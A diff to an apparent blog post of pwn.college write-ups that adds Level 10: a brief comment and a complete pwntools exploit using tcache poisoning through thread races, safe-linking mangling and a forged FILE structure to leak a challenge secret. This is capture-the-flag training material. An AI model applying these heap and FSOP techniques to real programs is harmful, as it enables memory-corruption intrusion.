@@ -1,7 +1,7 @@
 ---
-title: "Write-ups: Software Exploitation (Exploitation Primitives) series"
+title: "Write-ups: Software Exploitation (Exploitation Primitives) series (Completed)"
 published: 2025-11-21
-updated: 2025-12-02
+updated: 2025-12-09
 description: "Write-ups for pwn.college binary exploitation series."
 image: "https://ghproxy.net/https://raw.githubusercontent.com/CuB3y0nd/picx-images-hosting/master/.wizenf9io.avif"
 tags: ["Pwn", "Write-ups", "FSOP"]
@@ -1997,6 +1997,221 @@ def main():
 
     quit(0)
     quit(1)
+
+    thread[0].interactive()
+
+
+if __name__ == "__main__":
+    main()
+```
+
+# Level 10
+
+## Information
+
+- Category: Pwn
+
+## Description
+
+> Create and use arbitrary read/write primitives with less control of the heap II.
+
+## Write-up
+
+~~吃屎吃的最难受的一集。~~
+
+不想破伪随机数发生器，那就想办法确定你能确定的，想办法猜出你不能确定的（
+
+## Exploit
+
+```python
+#!/usr/bin/env python3
+
+import argparse
+
+from pwn import (
+    ELF,
+    FileStructure,
+    context,
+    flat,
+    os,
+    process,
+    raw_input,
+    remote,
+    sys,
+)
+
+parser = argparse.ArgumentParser()
+parser.add_argument("-L", action="store_true")
+parser.add_argument("-T", "--threads", type=int, default=None, help="thread count")
+args = parser.parse_args()
+
+
+FILE = "/challenge/babyprime_level10.0"
+HOST, PORT = "localhost", 1337
+
+context(log_level="debug", binary=FILE, terminal="kitty")
+
+elf = context.binary
+libc = elf.libc
+
+
+def printf(tid, idx):
+    thread[tid].sendline(f"printf {idx}".encode())
+
+
+def malloc(tid, idx):
+    thread[tid].sendline(f"malloc {idx}".encode())
+
+
+def scanf(tid, idx, content):
+    thread[tid].sendline(f"scanf {idx} {content}".encode())
+
+
+def scanf_raw(tid, idx, content):
+    thread[tid].sendline(f"scanf {idx} ".encode() + content)
+
+
+def free(tid, idx):
+    thread[tid].sendline(f"free {idx}".encode())
+
+
+def quit(tid):
+    thread[tid].sendline(b"quit")
+
+
+def arbitrary_read(poison_idx, result_idx, addr):
+    global rand_size
+
+    BAD_BYTES = {b"\x20", b"\x0c", b"\x0a", b"\x0d", b"\x09", b"\x0b"}
+
+    packed_addr = flat(addr)
+    if any(bytes([byte]) in BAD_BYTES for byte in packed_addr):
+        raise ValueError(
+            f"Address {hex(addr)} contains a bad byte for scanf: {packed_addr.hex()}"
+        )
+
+    while True:
+        thread[0].send((f"malloc {poison_idx} free {poison_idx}\n".encode()) * 10000)
+        if os.fork() == 0:
+            thread[1].send(
+                (f"scanf {poison_idx}".encode() + packed_addr + b"\n") * 10000
+            )
+            os.kill(os.getpid(), 9)
+        os.wait()
+
+        malloc(0, poison_idx)
+        printf(0, poison_idx)
+        thread[0].recvuntil(b"MESSAGE: ")
+        poisoned = int.from_bytes(thread[0].recvline().strip(), "little")
+
+        if flat(poisoned) == packed_addr:
+            break
+
+    # raw_input("DEBUG")
+    malloc(0, result_idx)
+    printf(0, result_idx)
+
+
+def arbitrary_write(poison_idx, result_idx, addr, content):
+    arbitrary_read(poison_idx, result_idx, addr)
+    # raw_input("RAW SCANF")
+    scanf_raw(0, result_idx, content)
+
+
+def mangle(pos, ptr, shifted=1):
+    if shifted:
+        return pos ^ ptr
+    return (pos >> 12) ^ ptr
+
+
+def demangle(pos, ptr, shifted=1):
+    if shifted:
+        return mangle(pos, ptr)
+    return mangle(pos, ptr, 0)
+
+
+def launch():
+    global target, thread
+
+    if args.L and args.threads is not None:
+        raise ValueError("Options -L and -T cannot be used together.")
+
+    if args.L:
+        target = process(FILE)
+    elif args.threads:
+        if args.threads <= 0:
+            raise ValueError("Thread count must be positive.")
+        process(FILE)
+
+        thread = [remote(HOST, PORT, ssl=False) for _ in range(args.threads)]
+    else:
+        target = remote(HOST, PORT, ssl=True)
+
+
+def main():
+    launch()
+
+    thread[0].recvuntil(b"Your flag is: ")
+    flag_p0 = thread[0].recvuntil(b"..!\n")[:-4]
+    thread[0].success(f"flag_p0: {flag_p0}")
+
+    malloc(0, 0)
+    free(0, 0)
+    malloc(0, 0)
+    printf(0, 0)
+
+    thread[0].recvuntil(b"MESSAGE: ")
+    pos = int.from_bytes(thread[0].recvline().strip(), "little")
+    heap = pos << 12
+
+    hexpos = hex(pos)[2:]
+    if len(hexpos) != 9:
+        thread[0].failure(f"invalid pos (need equal to 9 hex digits): {hex(pos)}")
+        try:
+            thread[0].close()
+            thread[1].close()
+        except:
+            pass
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+
+    thread_stdout = heap - 0x102B0
+    secret = thread_stdout + 0x3C0
+
+    thread[0].success(f"pos: {hex(pos)}")
+    thread[0].success(f"stdout: {hex(thread_stdout)}")
+    thread[0].success(f"secret: {hex(secret)}")
+
+    expected_low = 0x0D50
+    low_16 = thread_stdout & 0xFFFF
+
+    if low_16 != expected_low:
+        thread[0].failure(f"bad stdout low bits: {hex(low_16)} != {hex(expected_low)}")
+
+        try:
+            thread[0].close()
+            thread[1].close()
+        except:
+            pass
+
+        os.execv(sys.executable, [sys.executable] + sys.argv)
+
+    # raw_input("DEBUG")
+    malloc(0, 2)
+    malloc(0, 4)
+    free(0, 4)
+    free(0, 2)
+
+    fp = FileStructure()
+    fp.write(secret, 0x100)
+    fp.fileno = 5
+
+    arbitrary_write(
+        2,
+        4,
+        mangle((pos) - 0x3, thread_stdout),
+        fp.struntil("_flags2"),
+    )
+    malloc(0, 10)
 
     thread[0].interactive()
 
